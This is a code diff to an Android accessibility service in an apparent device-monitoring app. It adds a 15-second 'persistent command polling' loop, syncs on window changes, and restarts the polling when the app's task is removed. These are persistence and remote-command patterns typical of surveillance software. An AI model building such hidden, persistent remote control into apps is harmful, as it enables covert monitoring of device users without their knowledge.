@@ -81,9 +81,32 @@ class BlockAccessibilityService : AccessibilityService() {
     )
     private val browserPackages = browserUrlBarIds.map { it.substringBefore(":id/") }.toSet()
 
+    private var lastInteractiveEventTime = 0L
+    private var commandPollJob: kotlinx.coroutines.Job? = null
+
+    private fun startPersistentCommandPolling() {
+        commandPollJob?.cancel()
+        commandPollJob = scope.launch {
+            Log.i(TAG, "Starting persistent command polling loop (15s heartbeat)")
+            while (coroutineContext[kotlinx.coroutines.Job]?.isActive == true) {
+                try {
+                    com.spapp.monitoring.sync.SyncRunner(applicationContext).runOnce()
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error in persistent command poll heartbeat", e)
+                }
+                kotlinx.coroutines.delay(15_000L)
+            }
+        }
+    }
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
+        try {
+            startPersistentCommandPolling()
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start persistent command polling", e)
+        }
         try {
             val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
             info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
@@ -574,6 +597,11 @@ class BlockAccessibilityService : AccessibilityService() {
         }
 
         if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val now = android.os.SystemClock.uptimeMillis()
+            if (now - lastInteractiveEventTime > 10_000L) {
+                lastInteractiveEventTime = now
+                com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+            }
             if (packageName in browserPackages) {
                 checkWebsiteRules()
                 startBrowserPolling()
@@ -3179,6 +3207,7 @@ class BlockAccessibilityService : AccessibilityService() {
     override fun onTaskRemoved(rootIntent: android.content.Intent?) {
         super.onTaskRemoved(rootIntent)
         Log.i("BlockA11y", "onTaskRemoved: maintaining background services and sync scheduling")
+        startPersistentCommandPolling()
         com.spapp.monitoring.sync.SyncScheduler.schedule(applicationContext)
         com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
     }
@@ -3186,6 +3215,7 @@ class BlockAccessibilityService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         instance = null
+        commandPollJob?.cancel()
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.stop(applicationContext)
     }
 
